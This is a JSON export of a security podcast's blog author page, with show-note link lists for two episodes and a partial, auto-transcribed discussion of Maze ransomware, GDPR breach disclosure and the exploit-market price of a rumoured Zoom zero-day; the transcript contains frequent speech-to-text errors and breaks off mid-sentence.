{"hash":"70415c5045185ae914cc2d9e1a44ab9bda681e04","data":{"author":{"name":"Specter","path":"/author/specter/","profile_image":"https://dayzerosec.com/content/images/2019/11/specter-1.png","belongsTo":{"edges":[{"node":{"title":"Episode 24 - SHA-mbles, Shitrix, Responsible Disclosure, and wtf is TikTok doing.","path":"/posts/episode-24/","date":"14 January 2020","description":"Start off with zi fumbling to describe Sha-mbles, but quickly get into our groove as we discuss #Shitrix, Responsible Disclosure, and other exploits.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/tZZS5-iDtTw\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Watch live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<ul>\n<li>[00:00:35] <a href='https://sha-mbles.github.io/'>SHA-1 is a Shambles</a></li><br />\n<ul><li><a href='https://www.youtube.com/watch?v=Gh6p7Y74m9A'>https://www.youtube.com/watch?v=Gh6p7Y74m9A</a></li></ul><br />\n<li>[00:14:50] <a href='https://blog.malwarebytes.com/android/2020/01/united-states-government-funded-phones-come-pre-installed-with-unremovable-malware/'>Government-funded phones come pre-installed with unremovable malware</a></li><br />\n<li>[00:22:09] <a href='https://www.mozilla.org/en-US/security/advisories/mfsa2020-03/'>Security Vulnerabilities fixed in Firefox 72.0.1 and Firefox ESR 68.4.1 â€” Mozilla</a></li><br />\n<li>[00:27:02] <a href='https://support.citrix.com/article/CTX267027'>CVE-2019-19781 - Vulnerability in Citrix Application Delivery Controller and Citrix Gateway</a></li><br />\n<ul><li><a href='https://github.com/projectzeroindia/CVE-2019-19781'>https://github.com/projectzeroindia/CVE-2019-19781</a></li></ul><br />\n<ul><li><a href='https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/'>https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/</a></li></ul><br />\n<ul><li><a href='https://twitter.com/GossiTheDog/status/1215785949709459456'>https://twitter.com/GossiTheDog/status/1215785949709459456</a></li></ul><br />\n<li>[00:38:20] <a href='https://googleprojectzero.blogspot.com/2020/01/policy-and-disclosure-2020-edition.html'>Project Zero: Policy and Disclosure: 2020 Edition</a></li><br />\n<ul><li><a href='https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html'>https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html</a></li></ul><br />\n<li>[00:52:07] <a href='https://siguza.github.io/PAN/'>Privileged Access Never (PAN) - Another day, another broken mitigation.</a></li><br />\n<li>[00:57:43] <a href='https://research.checkpoint.com/2020/tik-or-tok-is-tiktok-secure-enough/'>Tik or Tok? Is TikTok secure enough?</a></li><br />\n<li>[01:18:33] <a href='https://seclists.org/fulldisclosure/2020/Jan/10'>Fortinet FortiSIEM Hardcoded SSH Key</a></li><br />\n<li>[01:22:58] <a href='https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-1.html'>Project Zero: Remote iPhone Exploitation Part 1: Poking Memory via iMessage and CVE-2019-8641</a></li><br />\n<li>[01:32:00] <a href='https://arxiv.org/abs/2001.01952v1'>WAF-A-MoLE: Evading Web Application Firewalls through Adversarial Machine Learning</a></li><br />\n<li>[01:36:00] <a href='https://arxiv.org/abs/2001.03418v1'>QSOR: Quantum-Safe Onion Routing</a></li><br />\n<li>[01:45:09] <a href='http://jakob.space/blog/browser-games-aren-t-an-easy-target.html'>Browser Games Aren't an Easy Target</a></li><br />\n<li>[01:46:31] <a href='https://xy2.dev/article/re-skgba/re-skgba.html'>Reverse engineering RNG in a GBA game</a></li><br />\n<ul><li><a href='https://en.wikipedia.org/wiki/Linear_congruential_generator#Parameters_in_common_use'>https://en.wikipedia.org/wiki/Linear_congruential_generator#Parameters_in_common_use</a></li></ul><br />\n\n</ul><!--kg-card-end: html-->","slug":"episode-24"}},{"node":{"title":"Episode 38 - Binary Ninja's Decompiler, git credential leak, cross-platform LPEs","path":"/posts/episode-38/","date":"21 April 2020","description":"Zoom vuln worth $500k? Probably not... What is worth $500k? Binary Ninja's new decompiler...okay probably not but it is exciting.We've also got some stupid issues and some interesting LPEs this episode.\n","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ys1dU_Xd3cE\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>Zoom vuln worth $500k? Probably not... What is worth $500k? Binary Ninja's new decompiler...okay probably not but it is exciting.We've also got some stupid issues and some interesting LPEs this episode.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=37\">00:00:37</a>] <a href=\"https://www.bleepingcomputer.com/news/security/it-services-giant-cognizant-suffers-maze-ransomware-cyber-attack/\">Cognizant suffers Maze Ransomware cyber attack</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=856\">00:14:16</a>] <a href=\"https://www.vice.com/en_us/article/qjdqgv/hackers-selling-critical-zoom-zero-day-exploit-for-500000\">Hackers Are Selling a Critical Zoom Zero-Day Exploit for $500,000</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=1674\">00:27:54</a>] <a href=\"http://adventures.michaelfbryan.com/posts/lastpass/\">How I Reverse Engineered the LastPass CLI Tool</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=2167\">00:36:07</a>] <a href=\"https://binary.ninja/2020/04/16/state-of-the-ninja-ep13.html\">State of the Ninja: Episode 13</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=3746\">01:02:26</a>] <a href=\"https://hackerone.com/riot/\">Riot offering up to $100k n Bug Bounty</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=3939\">01:05:39</a>] <a href=\"https://security.googleblog.com/2020/04/research-grants-to-support-google-vrp_20.html\">Research Grants to support Google VRP Bug Hunters during COVID-19</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=4156\">01:09:16</a>] <a href=\"https://hackerone.com/reports/591302\">Denial of service to WP-JSON API by cache poisoning</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=4311\">01:11:51</a>] <a href=\"https://stazot.com/prestashop-csrf-to-rce-article/\">CSRF to RCE bug chain in Prestashop</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=4884\">01:21:24</a>] <a href=\"https://hackerone.com/reports/777957\">Unintended disclosure of OTP</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=5068\">01:24:28</a>] <a href=\"https://insomniasec.com/blog/auth0-jwt-validation-bypass\">JSON Web Token Validation Bypass in Auth0 Authentication API</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=5234\">01:27:14</a>] <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2021\">git: Newline injection in credential helper</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=5488\">01:31:28</a>] <a href=\"https://research.nccgroup.com/2020/04/15/cve-2019-1381-and-cve-2020-0859/\">How Misleading Documentation Led to a Broken Patch for a Windows Arbitrary File Disclosure Vulnerability</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=5802\">01:36:42</a>] <a href=\"https://www.guardicore.com/2020/04/pwning-vmware-vcenter-cve-2020-3952/\">Pwning vCenter with CVE-2020-3952</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=6327\">01:45:27</a>] <a href=\"https://packetstormsecurity.com/files/157282/2020-07-solaris-whodo-w.txt\">Oracle Solaris 11.x/10 whodo/w Buffer Overflow</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=6690\">01:51:30</a>] <a href=\"https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification\">Linux Kernel EoP via Improper eBPF Program Verification [CVE-2020-8835]</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=7067\">01:57:47</a>] <a href=\"https://blog.zimperium.com/multiple-kernel-vulnerabilities-affecting-all-qualcomm-devices/\">Multiple Kernel Vulnerabilities Affecting All Qualcomm Devices</a><br />\n\t<ul><li><a href=\"https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=c4f42c24e02ce82392d8f8fe215570568380c8ab\">https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=c4f42c24e02ce82392d8f8fe215570568380c8ab</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=7648\">02:07:28</a>] <a href=\"https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html\">Ricerca Security: \"SMBGhost pre-auth RCE</a><br />\n\t<ul><li><a href=\"https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/\">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=8049\">02:14:09</a>] <a href=\"https://www.syssec.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2020/02/27/IJON-Oakland20.pdf\">IJON: Exploring Deep State Spaces via Fuzzing</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=8614\">02:23:34</a>] <a href=\"https://github.com/wcventure/FuzzingPaper#pangolin-incremental-hybrid-fuzzing-with-polyhedral-path-abstraction-sp-2020\">Pangolin: Incremental Hybrid Fuzzing with Polyhedral Path Abstraction</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ys1dU_Xd3cE&t=8873\">02:27:53</a>] <a href=\"https://github.com/wcventure/FuzzingPaper\">GitHub - wcventure/FuzzingPaper</a><br />\n\t<ul></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<!--TRANSCRIPT\n{\"transcript\": [{\"speaker\": 1, \"line\": \" Hello everyone. Welcome to another episode of the day Zero podcast. I'm Specter with me a zi as well as anti because the anti is with us. We're going to be front loading the podcast with some of the more threat Intel related topics. So we'll jump right into those because anti he's not going to be with us for the full episode is going to be with us for about probably like 20 or 30 minutes or so. I'm guessing so we'll just we'll jump into the first topic he wanted to bring up which is cognizant suffering maze ransomware cyber attacks. So anti would you be able to jump into that one? Because I haven't really I didn't get a chance to look at that one too much did it some other topics but I know you wanted to bring this one up. So I'll let you jump into it.\", \"start\": 16.7}, {\"speaker\": 2, \"line\": \" Yeah, give me one second to pull up the link here is having a little bit technical issues. But yeah, so the maze ransomware for anyone who's not aware of what this is why it matters. So maze ransomware is one of the groups that is pretty prolific right now. They're one of the first groups that Equally, once they hit you with ransomware, they would post your company's information on their little website and then force you to pay because all your information is exposed. Right? So it's it's another type of ransomware. They don't just encrypt everything but they also publish it until you pay them. So what's fascinating is they've actually spawned a whole bunch of recent ransomware variants that like have caused, you know them to change their way of thinking so things like the limb and empty. I'm sure these all sound like archaic names to some people but Actually, it's kind of changed the business model of how ransomware is working at present. So maze ransomware recently hit organization called cognizant. I believe about use them. So but I know that they're pretty large and so I thought it was fascinating to see that even these like huge kind of it organizations that no matter how many preparations you have in place, right especially for an organization that manages other people's infrastructure, you know the risk of being hit by something like ransomware as pretty steady and you know you Guys kind of\", \"start\": 58.2}, {\"speaker\": 3, \"line\": \" so I actually I want to bring up question with that. It seems to me like the standing recommendation has generally been to just pay the ransom Ware that runs more generally at least like, you know, you pay it you do get your content decrypt and you're good to go it has that been true or am I misinformed\", \"start\": 137.1}, {\"speaker\": 2, \"line\": \" so it's a little bit of both, right? You know, like because I thought the\", \"start\": 157.7}, {\"speaker\": 3, \"line\": \" FBI. Yeah. I thought the FBI had given the advice is just simply just At\", \"start\": 162.5}, {\"speaker\": 2, \"line\": \" yeah, they definitely so you'll hear like the info seconds tribute. Like don't pay them you're paying criminals and so on but the FBI yet, they've admitted that basically what are you going to do? Right? So yes realistically if you want your information decrypt it is going to you're going to have to likely pay most of these ransomware variants people haven't figured out like it's just incription, you know what I mean? So it's secure and it's sense that the way they're going about it usually would like two sets of keys. You're not going to be able to like decrypt that content yourself and the the hard part is, you know, Even a third party company like they talked to the threat actors or whatever the hell you want to come for you. It doesn't change the fact that you're craps encrypted. So, you know the hardest part actually that most people deal with is not even paying for it because it's trivial for multi, you know hundreds of millions of dollars a company entrance that much it's actually that like the decryption itself right takes like months because it's slow and they're usually pretty crappy. So that's the caveat. Is that even if you pay them and you're losing like I've known some organizations lose like three to five million Day because everything is encrypted. It doesn't you know, it doesn't the sad part is even if you pay it it still takes two months your now losing, you know, in excess of you know hundreds of millions of dollars you have an if you pay the fair\", \"start\": 168.2}, {\"speaker\": 3, \"line\": \" point on that. I was more wondering if it was really necessary to publish the information to encourage payment because it seemed to me as somebody that hasn't been you know impacted by ransomware haven't been involved with company that's been impacted by ransomware. It seemed to me like generally they they were paying it. So you didn't need further encouragement to pay so just seemed like that that extra step just seems unnecessary to me.\", \"start\": 239.7}, {\"speaker\": 2, \"line\": \" I think it's because nowadays like you get some organizations that will go and publicly say like I'm not going to pay this right. So it's more of an incentive that if you want the trouble to stop like this group specifically maze I'd have to pull up their website right now, but they have it where there's a group that they think is compromised January that refused to pay right and even though they refuse to pay this group. May's group has still continued to kind of trash talk and tell them that like, you know, this group doesn't care and that you know, that made it a point that it doesn't just go away because you don't offer to pay the whole reason for that is to continue to post your information and you know, the legality of it of having that information out there kind of puts you in a weird spot, right?\", \"start\": 264.5}, {\"speaker\": 3, \"line\": \" Yeah, I could see where you know definitely adds a pressure and I could understand company that decides not to pay. I mean, it's similar, you know with paying for a kidnapping since you're paying the criminals. You're basically just encouraging the action further.\", \"start\": 304.3}, {\"speaker\": 1, \"line\": \" It's kind of like that. But associate with terrorists, yeah. Oh,\", \"start\": 319.5}, {\"speaker\": 2, \"line\": \" yeah. No, I mean you're right and idea that it honestly, like does it make a big difference your stuff's going to be encrypted one way or another probably not but I think the different ideas that they give them like two weeks to go and say if you don't want this in the news and blahbitty blah, well then just pay us now, right? Otherwise, that's when you see them publish it so then you don't just have two bad guys to worry about right you've now got the stress of media Outlets who wait for stuff like To happen harassing you you've got researchers and every single person annoying the crap out of you and when they publish it like most ransomware groups, if they're you know, just trying to stay low down they'll just encrypt the information right and then kind of annoys you about it to decrypt it if they have like these groups are taking that information as well. So then you run the risk of Bill now give it to all the other criminals, right?\", \"start\": 323.8}, {\"speaker\": 3, \"line\": \" Yeah. No, I definitely see where like a match. I definitely see where the pressure is coming from on that side. Like I see what's novel about this. This it was just kind of had that question about you know, it's a really necessary and I guess 0.2 go. Yeah, it does make a practical difference against those companies that might try and stand up to it a little\", \"start\": 368.1}, {\"speaker\": 2, \"line\": \" bit. Yeah, now that's that's kind of my you know synopsis really is just that I thought that this was interesting because of the fact that like I know lots of people talk about ransomware and stuff and kind of understand how it works, but I don't know. I just thought it was like old-school gangster type stuff where it's like, okay, I'm not just going to encrypt all your crap. Like I'm going to make it known that I've encrypted all your stuff and your clients are going to hate like, you know, it's just for\", \"start\": 388.2}, {\"speaker\": 3, \"line\": \" protection, you know going with that protection racket of the mafia.\", \"start\": 414.6}, {\"speaker\": 2, \"line\": \" If you let your neighbors know that I broke your windows and I fixed them to and if they don't want an Ali.\", \"start\": 420.5}, {\"speaker\": 1, \"line\": \" One thing I did notice just scrolling down the page a little bit is you know, they're saying that it should be treated as a data breach because there is an encrypted files being stolen. So like does that mean technically that under gdpr any companies that operate in Europe have to disclose when they're hit by ransomware now, like I never really liked I know gdpr is kind of a weird topic because it's pretty\", \"start\": 428.4}, {\"speaker\": 3, \"line\": \" vague, even if they weren't even if the files were being taken. I think just the fact that they would have been X or whooping access by the malware doing the encryption would be enough to Warrant the data breach\", \"start\": 453.6}, {\"speaker\": 1, \"line\": \" alert. Okay. Yeah, it was just something that I never really thought about it like obviously but you know if this is dumped on the on the web or something then that constitutes a data breach but just like it's a breach when it's\", \"start\": 466.1}, {\"speaker\": 3, \"line\": \" accessed. So what exactly happens from there, you know, it takes time to figure out what exactly happens in attack figure out what was actually taken in South bow the moment\", \"start\": 478.9}, {\"speaker\": 1, \"line\": \" it's access its breached.\", \"start\": 489.4}, {\"speaker\": 3, \"line\": \" At least as far as I know obviously, I'm not a lawyer. We're not lawyers on here. But she's\", \"start\": 492.7}, {\"speaker\": 2, \"line\": \" providing. Will your advice right now? That's what\", \"start\": 497.0}, {\"speaker\": 3, \"line\": \" yes, that's that's how you can take this run your company based off of my advice. I would highly recommend it. But yeah, as far as I'm aware of GDP are as soon as that axis happened it sort of breaks and we've kind of seen that with well with that shot off. I think we talked about a few episodes back. That one shop that got compromised and the white hat hacker who was acting fairly dark was kind of trying to leverage that saying they needed to disclose the breach because because he had access regardless of the fact that he had made a public yet. Did you have anything further to kind of add on\", \"start\": 499.9}, {\"speaker\": 2, \"line\": \" that? The only thing I would say is that you know to throw a little shade I think talking about gdpr and certain things. I'm not saying that companies aren't reporting it. But I do get this feeling that you know, because I've looked into some of these compromises and stuff like that. I'm very comfortable saying that there's probably some companies who aren't reporting like they're supposed to I can't name and shame because I don't know for sure. I think there's no hard to fix. Aren't necessarily aware yet. They need to be reporting all the\", \"start\": 542.8}, {\"speaker\": 3, \"line\": \" time or of was level they need a report at and that's not an excuse. It is one of the things I appreciate with GPR is I do think you know companies need to be more responsible about disclosing when informations been breached. So like I agree with GDP are kind of pushing that although I do realize it adds a little bit extra work for like the small businesses and stuff, but Yeah, I definitely agree. There are there are going to be companies that aren't necessarily alerting on the base of a breach part of that's going to come down to being able to detect the breach small business isn't necessarily going to have the same skills to actually detect. Hey, they've been breached. I do think this is an interesting case because they you were mentioning about it taking months to decrypt if it's taking months to decrypt. It's probably taking a while to encrypt all so they're probably sitting on there for a while this particular. Page from bleeping computer mentions that attackers were likely on the network for weeks.\", \"start\": 572.3}, {\"speaker\": 2, \"line\": \" Yeah, and I don't wanna interrupt Specter. I know he probably had some say so if you want to throw your hat into the mix real quick Specter, I did have a response to that though. Zi.\", \"start\": 631.5}, {\"speaker\": 1, \"line\": \" Okay. What I just wanted to say was with the GDP our Point specifically even though it technically Viola GDP are not disclosing if these kinds of breaches happen. The problem is how much is it actually enforced? You know, I don't have the data laid out for that, but I Imagine they're probably not really aggressively enforcing\", \"start\": 638.9}, {\"speaker\": 3, \"line\": \" us. So actually gdpr does have some bite. I couldn't I wasn't expecting a name any particular instances, but there have been some significant fines around gdpr. So I would say that it does have a bite. Okay Fern I couldn't say in particular sure because I mean there's also the case of if they don't alert that there's a bridge how do you even find out that\", \"start\": 658.7}, {\"speaker\": 1, \"line\": \" there was a breach\", \"start\": 679.2}, {\"speaker\": 3, \"line\": \" I mean depending on the type of criminals that actually did the bridge they're not necessarily going to be dumping it or how it gets you. Is might not be clear. So I mean, I'm sure there are companies that can get away without reporting because the criminals just have to kind of keep it quiet. They had the data from this Source or you couldn't actually isolate what the source of the information was.\", \"start\": 680.8}, {\"speaker\": 2, \"line\": \" Yeah. Now that's probably a fair point and I think you know, I mean, it does have a little bit of bite, you know, if you look at Facebook and I think even Google have been sued based on GDP are or find I should say not suit the find based on those. So I mean it does have an impact now. Like you kind of talked about Specter how big of an impact again a mom and pop shop. Are you going to go drag him through the mud and stabbed him in the leg like how dare you know, like, you know, who knows how deep it really goes if it's not a big big company, but you know to kind of summarize on one point Z, it does happen that most of these campaigns and once that I've even seen, you know, it doesn't just happen overnight like oh no, you know, I went and walked away for coffee and my whole network isn't Clint completely encrypted like it. Isn't to my knowledge. I haven't seen anything like that. But the problem is usually a lot of these companies, you know, just I think even there's a I don't know if stop my head maybe I can provide a link there was some government agency. I think of something with the power grid in South America that basically like gigabytes if not terabytes of information was siphoned out and stuff like that. So all these people don't have any cognizant idea of like the initial state which is usually the loader right? So these things start with like a very basic malware, Are not necessary basic but one that's just meant to drop more malware, right? So trick bought and a few other variants then it kind of sets and Scopes out the network then it's like multi stage is where they go and run things. Like I don't know if it was Powershell Empire, but there's definitely a few things like Cobalt strike some of the stuff that like pentesters use they'll go and like compromise all kinds of other servers and active directory and stuff like that to get as much access as they can. So normally it probably takes about a week but they have there has been some research that I've shown like some of these campaigns the second they get a foothold through like Like RDP or something. It'll take them like 48 hours to map out your network and then drop like something like Ryu quic then just encrypts everything so long story short. Usually if you have really good liquid setup, you can maybe catch this in the early stages, but unfortunately, it doesn't seem to matter and malware just I me and that's kind of\", \"start\": 700.3}, {\"speaker\": 3, \"line\": \" a wider issue in general. There's a little bit of once you're through the perimeter. There's just trust trust everybody that's kind of inside the perimeter and that's a mistake. I think for a lot of companies that have that type of network setup, but that generally Wide what? It is, especially on smaller side, once you're in you're in and then you kind of just have maybe they're you know zi mention 80 and stuff. But like maybe there's a little bit more access control, but it's very soft once you're inside. But I think I do want to get on to the other topic before you have to take off. So if you're good with you, but go ahead. Let's hear it. Yeah. Well, so the other topic is the well potentially here from Vice hackers are selling a critical Zoom. Zero-day exploit for $500,000\", \"start\": 823.7}, {\"speaker\": 1, \"line\": \" zooming back into the news. Of course. Yes, of\", \"start\": 870.4}, {\"speaker\": 3, \"line\": \" course soon. You know what so I'm going to say, I don't know if I believe this I believe the advertisement is there. I am not sure I believe so you can put an advertisement up for anything at any price. I mean, I remember during the grease this is yours going Greece had some financial problems. Somebody put grease up on eBay for how it like. However much money was at the EU was offering like you obviously this isn't being sold on eBay. But so I believe that's there. I don't know if the markets really there at\", \"start\": 872.9}, {\"speaker\": 1, \"line\": \" $500,000. I doubt it. I think it's worth that much.\", \"start\": 909.5}, {\"speaker\": 3, \"line\": \" No no neither do I and I mean the big thing is and we can kind of go into a further discussion overpricing something exploits, but the thing is is zoom zero day. First of all, it sounds like some of these require you to be on the call with some I so it's not like corporate Espionage or you're going to secretly get on the call. You're going to have to already be in there and it's to infect to whoever you're calling so that someone limits the use\", \"start\": 914.6}, {\"speaker\": 1, \"line\": \" to You\", \"start\": 936.9}, {\"speaker\": 3, \"line\": \" already have to be at rest individual but in terms of the lifespan of an exploit like this the problem with the exploits or something, like, you know, even Facebook or zoom in this case is they're going to get Pat reasonably quickly as soon as you start abusing it whereas, you know issues like, you know, I'll in Excel PE, you know, everybody who's running Linux needs to go and do that upgrade with some like Zoom. There's that centralized patch if they patch On the server. It's patch\", \"start\": 938.8}, {\"speaker\": 1, \"line\": \" for everybody pretty much,\", \"start\": 969.9}, {\"speaker\": 3, \"line\": \" you know, if it's client-side. Okay, maybe takes a little while. There's on my updates. So the lifespan of those excellent just doesn't last that long now to be fair. There's definitely a chance that prices are being pushed up just because everybody's all of a sudden using Zoom. So like I don't have like the Hands-On knowledge actually say, but I'm definitely skeptical the 500,000 price tag.\", \"start\": 973.0}, {\"speaker\": 1, \"line\": \" See part of the reason I could see the only reason I could see it maybe being even close to worth that much is because we have you know, as we've talked about in the past. We have seen governments using it. Like I think the UK government was using it for a little while, but that being said due to all the zoom issues that we have covered in the past as well. We've been seeing governments actually being recommended to and moving away from using Zoom as well. So while it has gained popularity, I think it's starting to lose some of that popularity, especially in the Like potential targets that you want to hit with spending that much money on it. I can see it maybe being closer to like Fifty to a hundred K. But 500k seems like way\", \"start\": 996.5}, {\"speaker\": 3, \"line\": \" outlandish. It really does. I mean even so I can't think of too many other companies that will advertise the price that they're buying exploits at beside 0 DM. Yeah 0 DM like their web stuff like generally anything that's touching on the web. They're paying you know up to like 10,000 dollars for Stuff hitting the web that includes compromising like the mail servers in particular. Well, no the mail you I guess technically because it's round Cuban hoard that they're paying for.\", \"start\": 1035.8}, {\"speaker\": 1, \"line\": \" I was going to say the only thing when you like zero teams are pretty good Baseline, the only things you're looking at and the 250 to 500 K range is either all server Tech or browser and mobile rces. And that's all you're getting.\", \"start\": 1065.7}, {\"speaker\": 3, \"line\": \" Yeah, and to be fair at the hundred thousand range. They do have like WordPress RCC panel Plus.\", \"start\": 1079.6}, {\"speaker\": 2, \"line\": \" But again,\", \"start\": 1086.5}, {\"speaker\": 3, \"line\": \" like it's not desktop applications like Zoom would be it's not a browser. So I mean I could see why I like somebody really desperate for Zoom thing might pay more. That's why I said because there's that could be pushing the prices off but just using kinda the knowledge that we have. I was here damn in 0 DM is gray market and ugly. It's not black market pricing, but that's kind of the other thing when you're talking about the government the government's usually buying great Market as far as I'm aware. I'll know if anti if you want to correct me on that. But I believe the government's usually going to buy from brokers who are going to buy kind of on the gray Market.\", \"start\": 1087.6}, {\"speaker\": 2, \"line\": \" Yeah, normally so the way it works in my understanding in this is In fairness. I'm not a government, you know that bias exploits. So please don't, you know quote me on this book to my understanding and people have talked with the government normally. Yes buys from like third-party so that there's less of a risk, right so that if I go I could say normally they don't buy to like zi rhodium or be zero day initiative. I don't think zi zi offers that but yeah, they go through a third party that then we'll go and find actually those things on their behalf that whole point so that they can kind of even distance themselves more. There's a whole reason that you have to go through all these like compliance checks and crap for selling to the government. So I assume you know for the most part. Yeah, they're not going just straight to the the hackers and stuff.\", \"start\": 1126.6}, {\"speaker\": 3, \"line\": \" Yeah. So and the reason why I brought that up that was just because that kind of indicates that the people that are buying off the black market they aren't the government.\", \"start\": 1169.8}, {\"speaker\": 1, \"line\": \" Targeting\", \"start\": 1179.2}, {\"speaker\": 3, \"line\": \" people it's going to be the kind of criminal say organized crime perhaps which again the demand there seems more like exploit kits. Well not I mean so I corporate Espionage I think is the other great big area.\", \"start\": 1179.7}, {\"speaker\": 2, \"line\": \" What and I would caution like I have regular fights with people about this is that they'll go and say well just because it's only worth, you know this much in real life right like a amongst exploit Brokers. It's got to be worth like double that in the underground or some nonsense. You're like actually Lee I usually find that it's worth less in the underground because it's not like most cybercriminals dude or spending $500,000 for next week. That's insane. They can't make that much money. But if they can make that much money back like it would never be for something that has this little utility. You know what I mean? There's no full chain. There's there's it's only working for you. No one platform like and they didn't even talk about what like which versions of Windows which versions of Zoom so like I don't see most of these things. Even when there was some supposed went with exploits right rces. I was seeing them being offered at like 50k and craziness like that. Whereas there obviously worth a lot more than exploit broker stuff. So\", \"start\": 1194.0}, {\"speaker\": 3, \"line\": \" yeah, I think it's definitely great with you like my experience with the black market\", \"start\": 1250.6}, {\"speaker\": 2, \"line\": \" which has been limited but\", \"start\": 1254.5}, {\"speaker\": 3, \"line\": \" is that it's generally offering less not more unless you have something very very particular. I guess. I'll say\", \"start\": 1256.0}, {\"speaker\": 1, \"line\": \" Would it be fair to classify Black Market more as less exclusive selling but selling to more people and that's why it's valued at less. So even though it's valued at less you could potentially be making more money in the end because you're selling the more people but because you're selling the more people that bug is probably going to dial up faster too. So I think that's like one of the bigger differences between the gray Market in the black market generally in the gray market, like if if you sell to like zi rhodium or something like that. They're going to want exclusive access. To that, you know, they're not going to want you to go sell that to another exploit though. I gently\", \"start\": 1264.7}, {\"speaker\": 3, \"line\": \" 0 DM themselves and they do they sell they don't sell it exclusively. But yeah,\", \"start\": 1298.8}, {\"speaker\": 1, \"line\": \" they were generally when you're selling to a broker you're going to be selling it exclusively. Whereas when you're selling it on the black market. I think there's less of that exclusivity. So while it's true you are selling it like it's valued at less you are potentially making more but it's probably gonna die faster too. So that's why I think that's partially why governments probably Don't even touch the black markets. It's because they want that exclusivity.\", \"start\": 1304.9}, {\"speaker\": 3, \"line\": \" Yeah, it's in Chad Razzie. Woohoo mentions. I am. Oh that's 500k articles more of an ad for vice the show they're down with current events rather than call for Zoom user awareness. I mean, yeah, this isn't really about Zoom user awareness because this isn't going to impact most users of zoo. Anybody that's buying an X like $500,000 isn't just targeting the user base at Large. So it's definitely not just about alerting people to the fact that their Zoom. Oh days out there in terms of I mean Vice. They they're a little bit I'd say Sensational and biased and something reporting. That's at this the reason why I think we want to cover this also is it was picked up by more than just Vice of\", \"start\": 1328.9}, {\"speaker\": 1, \"line\": \" course,\", \"start\": 1374.9}, {\"speaker\": 3, \"line\": \" but I mean Vice itself. I'm I don't immediately trust what comes out. I mean they used to be pretty do some interesting stuff. I solemnly yeah, but I think we can save that discussion for another time.\", \"start\": 1377.9}, {\"speaker\": 2, \"line\": \" but there was a to that point there was a good quota saw the other day is that this article is basically a game of exploit broker telephone right where it's basically like, you know, well this person I haven't actually seen it myself but I heard that maybe it's sorta was like this where I don't even know what the hell if you know, like you can't even tell where this really came from and the other part is like their whole article turns into a whole but our cities have sold for hundreds of thousands of dollars before for and like, you know, they have 17 other links to other Zoom articles that they've written and my favorite part though for anyone reading this me see if I can find the section if you want to control F. There's a quote from quote-unquote. You can look for perfect for industrial Espionage some veteran of the cybersecurity industry calls it perfect for industrial Espionage. I was like, 